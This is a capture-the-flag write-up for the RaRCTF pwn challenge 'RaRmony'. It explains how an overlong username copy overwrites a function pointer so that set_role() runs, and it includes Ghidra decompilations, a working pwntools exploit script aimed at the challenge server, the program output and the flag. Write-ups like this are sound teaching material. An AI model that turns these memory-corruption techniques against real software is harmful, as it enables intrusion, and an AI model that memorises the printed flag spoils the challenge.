---
grand_parent: Categories
parent: Pwn
title: RaRmony
nav_order: 1
---

# RaRmony 
```
Discord is full of problems; so I made my own service for discussion and flags!

I came up with 'Harmony' as a name months before DragonCTF had their challenge, and I like the name >:(
```

## Challenge

> TL;DR: Buffer overflow to overwrite `update_username()` function ptr to `set_role()`. 

Running the program:
```
Harmony: Chat for CTFers

0. Read Channel
1. View User Info
2. Change role name
3. Change username
> 
```

The binary comprises of 4 different functionalities:
- `Read Channel` - Allow you to specify a channel to read
- `View User Info` - Displays your current user information
- `Change role name` - Modify your role
- `Change username` - Modify your username

The "secret-admin-chat" channel contains the flag. However, if you try to read that channel (Not that simple :smile:), you will get a "Not allowed to see this channel!" message. 

A snippet of ghidra's decompiled `print_channel()`
```c
  if (*(int *)(param_1 + 8) < *(int *)(current_user + 4)) {
    puts("Not allowed to see this channel!");
  }
```

`*(current_user + 4)` is evaluated to 2 while `*(param_1 + 8)` is evaluated to 0. Since 0 is less than 2, you will get the error message.

:dart: Goal: Modify `*(current_user + 4)` to 0 or less so that you can read "secret-admin-chat" channel.

:information_source: Note: You cannot modify the value of `param_1` as the binary used `param_1` to specify the channel name.

After analysing the binary, we found a vulnerability in `update_username()`. We can overwrite the function ptr which allows us to run arbitrary function.

Ghidra's decompiled update_username()
```c
void update_username(long param_1)

{
  size_t sVar1;
  long in_FS_OFFSET;
  undefined8 local_40;
  char local_38 [40];
  long local_10;
  
  local_10 = *(long *)(in_FS_OFFSET + 0x28);
  local_40 = param_1;
  printf("Enter new username: ");
  fgets(local_38,0x28,stdin);
  sVar1 = strlen(local_38);
  local_38[sVar1 - 1] = '\0';
  strncpy((char *)(local_40 + 0x10),local_38,0x28);
  if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return;
}
```

Knowledge gained after analysing the binary:
- From `main()`, we know that `update_username()` function is invoked using `**(current_user + 0x30)(current_user)` so `(current_user + 0x30)` contains the address of `update_username()`
- `local_40` variable in `update_username()` is `current_user`

The vulnerable line is:
```c
  strncpy((char *)(local_40 + 0x10),local_38,0x28);
``` 

Since the offset from `(current_user + 0x10)` to `(current_user + 0x30)` is less than 0x28, the above code will overwrite address of `update_username()` located at `(current_user + 0x30)`. Hence, changing "Change username" functionality. So, we can overwrite the actual function and run arbitrary function (HEHE! :sunglasses:)

Next challenge: Find a suitable function to overwrite.

We found `set_role()` function which modifies the value of `*(param_1 + 4)` to `param_2`

Ghidra's decompiled `set_role()`
```c
void set_role(long param_1,undefined4 param_2)

{
  *(undefined4 *)(param_1 + 4) = param_2;
  return;
}
```

Knowledge gained after analysing the binary:
- When the binary calls `update_username()`, the $rdi (1st arg) and the $rsi (2nd arg) contains the address of current_user and 0x0 respectively.

If we overwrite the address of `update_username()` with `set_role()`, we can modify the value of `*(current_user + 4)` to 0x0 (which is our goal). Then, we can read the "secret-admin-chat" channel

Working POC:
```python
from pwn import *

binary = ELF('./harmony')
set_role = b'\x3b\x15\x40'
#r = process('./harmony')
#pause()
r = remote('193.57.159.27', 28514)
r.recvuntil(b'> ')
r.sendline(b'3')
r.recvuntil(b'username: ')
r.sendline(b'A'*32 + set_role)
r.recvline(b'> ')
r.sendline(b'3') # update current_user + 4
r.recvline(b'> ')
r.sendline(b'0')
r.recvline(b'> ')
r.sendline(b'2')

r.interactive()
```

Output of the program:
```bash
$ python3 pwn4.py
[*] '/home/kali/Downloads/rarctf/rarmony/rarmony/harmony'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
[+] Opening connection to 193.57.159.27 on port 28514: Done
[*] Switching to interactive mode
0. Read Channel
1. View User Info
2. Change role name
3. Change username
> 
Harmony: Chat for CTFers

0. Read Channel
1. View User Info
2. Change role name
3. Change username
> Choose channel to view
0. general
1. pwn
2. secret-admin-chat
3. team-locator-inator
4. crypto
5. spam
6. rev
7. misc
8. web
> secret-admin-chat
Tony: In case I forget it, here's the flag for Harmony
Tony: rarctf{:O,Y0U-f0und-4-z3r0-d4y!!1!_0038abff7c}
wiwam845: no leek nerd smh
Tony: sad!
```

Flag: `rarctf{:O,Y0U-f0und-4-z3r0-d4y!!1!_0038abff7c}`